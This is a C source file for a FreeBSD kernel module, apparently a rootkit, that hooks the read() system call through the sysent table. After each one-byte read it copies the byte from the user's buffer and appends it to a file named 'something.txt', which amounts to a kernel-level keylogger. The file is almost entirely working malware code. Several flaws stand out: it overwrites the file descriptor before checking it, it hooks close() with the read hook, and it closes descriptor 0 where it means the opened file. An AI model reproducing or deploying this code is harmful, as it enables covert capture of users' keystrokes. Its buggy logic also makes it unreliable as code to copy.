#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/uio.h>
#include <sys/pcpu.h>
#include <sys/syscallsubr.h>
#include <sys/fcntl.h>
#include <sys/file.h>

/*
    Hook function for read() syscall.
*/
static int read_hook(struct thread *td, void *args)
{
    struct read_args *uap = (struct read_args *) args;

    // kernel space stuff
    char buf[64];
    int done = 0;

    // call original read
    int error = sys_read(td, args);
    //printf("error is %d\n", error);
    //force original file desc to be 0
    uap->fd = 0;
    //error handling to ensure bad address isn't hit
    if (error ||  uap->nbyte > 1||uap->fd != 0){
        return error;
    }

    //make sure copyinstr is 0 to avoid bad address
    if(copyinstr(uap->buf, buf, 64, &done) == 0){
        //returns a file descriptor for us to use
        //opens something.txt or create it if necessary
        error = kern_openat(td, AT_FDCWD, "something.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT| O_APPEND, 0777);
        int file_fd = error;

        //part of read and device drive for I/O
        struct iovec aiov;
        struct uio auio;

        bzero(&auio, sizeof(auio));
        bzero(&aiov, sizeof(aiov));

        //read from buffer with length of 1
        aiov.iov_base = &buf;
        aiov.iov_len = 1;


        //write to something.txt on the kernal
        auio.uio_iov = &aiov;
        auio.uio_iovcnt = 1;
        auio.uio_offset = 0;
        auio.uio_resid = 1;
        auio.uio_segflg = UIO_SYSSPACE;
        auio.uio_rw = UIO_WRITE;
        auio.uio_td = td;

        //write file descriptor
        error = kern_writev(td, file_fd, &auio);

        //close the file
        struct close_args fdtmp;
        fdtmp.fd = 0;
        sys_close(td, &fdtmp);
   }

    return error;
}

static int load_handler(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd){
        case MOD_LOAD:
            printf("LOADED\n");
            sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
            sysent[SYS_close].sy_call = (sy_call_t *) read_hook;
            break;
        case MOD_UNLOAD:
            printf("UNLOADED\n");
            sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
            sysent[SYS_close].sy_call = (sy_call_t *) sys_close;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t rk_mod = {
    "read_hook",   // module name
    load_handler,   // load function
    NULL
};

DECLARE_MODULE(read_rk, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
